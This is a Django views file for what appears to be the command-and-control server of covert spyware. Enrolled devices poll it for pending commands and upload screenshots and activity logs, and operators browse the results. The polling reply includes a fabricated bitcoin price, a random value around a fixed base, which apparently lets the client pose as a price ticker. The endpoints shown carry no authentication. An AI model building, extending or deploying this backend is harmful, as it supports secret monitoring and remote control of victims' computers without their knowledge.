import base64
import secrets
from datetime import datetime

from django.core.files.base import ContentFile
from django.core.paginator import Paginator
from django.shortcuts import get_object_or_404, render
from django.utils import timezone
from rest_framework import status
from rest_framework.decorators import api_view
from rest_framework.generics import CreateAPIView
from rest_framework.response import Response
from rest_framework.views import APIView

from core.models import ActivityLog, Command, Device, Screenshot
from core.serializers import (
    ActivityLogSerializer,
    CommandSerializer,
    DeviceListSerializer,
    DeviceSerializer,
    ScreenshotSerializer,
)

BASE_PRICE = 120000


@api_view(["POST"])
def device_create_or_update(request):
    """
    Create or update a device based on hardware_id.
    If hardware_id exists, update the device.
    If hardware_id doesn't exist, create a new device.
    """
    hardware_id = request.data.get("hardware_id")

    if not hardware_id:
        return Response({"error": "hardware_id is required"}, status=status.HTTP_400_BAD_REQUEST)

    try:
        # Try to get existing device
        device = Device.objects.get(hardware_id=hardware_id)
        serializer = DeviceSerializer(device, data=request.data, partial=True)
        is_created = False
    except Device.DoesNotExist:
        # Create new device
        serializer = DeviceSerializer(data=request.data)
        is_created = True

    if serializer.is_valid():
        device = serializer.save()

        # Update last_seen automatically
        device.last_seen = timezone.now()
        device.save(update_fields=["last_seen"])

        response_data = serializer.data
        response_status = status.HTTP_201_CREATED if is_created else status.HTTP_200_OK

        return Response(
            {
                "message": "Device created successfully" if is_created else "Device updated successfully",
                "created": is_created,
                "data": response_data,
            },
            status=response_status,
        )

    return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)


class GetDeviceDataAndCommandsView(APIView):
    def get(self, request, hardware_id):
        device = get_object_or_404(Device, hardware_id=hardware_id)
        device.last_seen = timezone.now()
        device.status = "online"
        device.save()

        btc_price = BASE_PRICE + secrets.randbelow(2001) - 1000

        pending_commands = Command.objects.filter(device=device, status="pending")
        commands_serializer = CommandSerializer(pending_commands, many=True)

        return Response(
            {
                "btc_price": btc_price,
                "commands": commands_serializer.data,
                "device_settings": device.settings,
            }
        )

    def post(self, request, hardware_id):
        device = get_object_or_404(Device, hardware_id=hardware_id)

        command_id = request.data.get("command_id")
        new_status = request.data.get("status")

        if command_id and new_status:
            try:
                command = Command.objects.get(id=command_id, device=device)
                command.status = new_status
                command.executed_at = timezone.now()
                command.save()

                return Response({"message": "Command status updated successfully."}, status=status.HTTP_200_OK)
            except Command.DoesNotExist:
                return Response({"error": "Command not found."}, status=status.HTTP_404_NOT_FOUND)
        return Response({"error": "Invalid request data."}, status=status.HTTP_400_BAD_REQUEST)


class ReportCommandStatusView(APIView):
    def post(self, request, hardware_id, command_id):
        device = get_object_or_404(Device, hardware_id=hardware_id)
        command = get_object_or_404(Command, id=command_id, device=device)
        command.status = "executed"
        command.executed_at = timezone.now()
        command.save()
        return Response({"message": "Command status updated successfully."}, status=status.HTTP_200_OK)


class UploadActivityDataView(APIView):
    def post(self, request, hardware_id):
        device = get_object_or_404(Device, hardware_id=hardware_id)
        serializer = ActivityLogSerializer(data=request.data)
        if serializer.is_valid():
            serializer.save(device=device)
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)


class UploadScreenshotView(CreateAPIView):
    serializer_class = ScreenshotSerializer

    def perform_create(self, serializer):
        hardware_id = self.kwargs["hardware_id"]
        device = get_object_or_404(Device, hardware_id=hardware_id)

        image_data = self.request.data.get("image_data")
        image_binary = base64.b64decode(image_data)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{hardware_id}_{timestamp}.png"
        image_file = ContentFile(image_binary, name=filename)

        serializer.save(device=device, image=image_file)

    def create(self, request, *args, **kwargs):
        serializer = self.get_serializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        self.perform_create(serializer)

        # Sadece success response döndür
        return Response({}, status=status.HTTP_201_CREATED)


def device_list_view(request):
    """Main device list page"""
    return render(request, "devices.html")


@api_view(["GET"])
def device_list_api(request):
    """Get all devices with stats"""
    devices = Device.objects.all().order_by("name")
    serializer = DeviceListSerializer(devices, many=True)
    return Response(serializer.data)


def screenshot_view(request, device_id):
    device = get_object_or_404(Device, id=device_id)
    context = {"device": device}
    return render(request, "screenshots.html", context)


@api_view(["GET"])
def latest_screenshot(request, device_id):
    """Get latest screenshot for device"""
    latest = Screenshot.objects.filter(device_id=device_id).order_by("-timestamp").first()

    if latest:
        serializer = ScreenshotSerializer(latest)
        return Response(serializer.data)

    return Response({"error": "No screenshots found"}, status=404)


def device_activities(request, device_id):
    """Device'a ait activity logları günceldan geriye doğru listele"""
    device = get_object_or_404(Device, id=device_id)

    activity_logs = ActivityLog.objects.filter(device=device).order_by("-timestamp")

    paginator = Paginator(activity_logs, 50)
    page_number = request.GET.get("page")
    page_obj = paginator.get_page(page_number)

    context = {
        "device": device,
        "activity_logs": page_obj,
        "total_logs": activity_logs.count(),
    }

    return render(request, "activities.html", context)


@api_view(["GET"])
def check_new_screenshot(request, device_id, last_id):
    """Check if new screenshot exists since last timestamp"""

    latest = Screenshot.objects.filter(device_id=device_id).order_by("-timestamp").first()

    if not latest:
        return Response({"has_new": False})

    if latest.id != last_id:
        serializer = ScreenshotSerializer(latest)
        return Response({"has_new": True, "screenshot": serializer.data})

    return Response({"has_new": False})
